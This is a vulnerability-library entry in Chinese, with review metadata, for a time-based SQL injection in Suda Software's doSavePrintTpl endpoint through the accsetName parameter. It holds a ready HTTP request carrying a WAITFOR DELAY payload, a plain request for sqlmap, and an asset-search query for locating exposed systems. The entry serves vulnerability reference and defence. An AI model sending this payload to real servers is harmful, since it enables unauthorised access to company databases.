---
source: "wy876 漏洞文库"
title: "速达软件 doSavePrintTpl accsetName SQL 注入"
product: "速达软件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server；产品和版本未列"
prerequisites: "请求含JSESSIONID"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/giuash5tw64if5lo"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF%EF%BC%88%E5%B9%BF%E5%B7%9E%EF%BC%89%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81doSavePrintTpl%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"速达软件技术（广州）有限公司\""
id: "vw-fa1241406abe45fd8dc554f3"
entity_id: "ve-fa1241406abe45fd8dc554f3"
schema_version: "1"
---

# 速达软件 doSavePrintTpl accsetName SQL 注入

## 条目说明

- 对象与具体问题：速达软件；doSavePrintTpl accsetName SQLi
- 版本、配置及部署条件：SQL Server；产品和版本未列
- 认证与权限前提：请求含JSESSIONID
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 额外sqlmap段只是正常请求不是结果；没有文本成功证据
- Hunter语法误放fofa，保存操作副作用/固定版本缺失

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
速达软件技术（广州）有限公司多款产品doSavePrintTpl存在SQL注入漏洞

## 二、影响版本
+ 速达软件技术（广州）有限公司多款产品

## 三、资产测绘
+ hunter`web.body="速达软件技术（广州）有限公司"`
+ 特征


## 四、漏洞复现
```http
GET /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=1&accsetName=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&modId=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=95EE3D005EFC17F6D1246339EA7617CB
Upgrade-Insecure-Requests: 1
```


sqlmap

```http
GET /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=1&accsetName=1&modId=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=95EE3D005EFC17F6D1246339EA7617CB
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/giuash5tw64if5lo>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
